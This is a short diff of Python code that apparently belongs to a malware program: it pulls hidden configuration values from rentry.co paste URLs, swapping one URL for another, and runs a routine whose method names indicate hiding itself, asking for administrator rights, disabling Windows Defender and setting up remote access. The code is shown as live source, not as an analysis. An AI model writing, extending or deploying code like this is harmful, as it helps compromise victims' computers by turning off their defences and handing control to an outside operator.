@@ -61,7 +61,7 @@ pleasegetsecretcore = "https://rentry.co/rh234/raw"
 thissecretcore = requests.get(pleasegetsecretcore)
 coresecretname = thissecretcore.text
 
-srdl_st_secret = "https://rentry.co/fcrza/raw"
+srdl_st_secret = "https://rentry.co/nxuf8/raw"
 thisst = requests.get(srdl_st_secret)
 stspecial = thisst.text
 
@@ -815,7 +815,6 @@ class first_srdl_func(Functions):
             self.srdl_exit_this()
 
         self.hide_so()
-        
         self.askadmin()
         self.srdl_disabledefender()
         self.remoter_srdl_err()
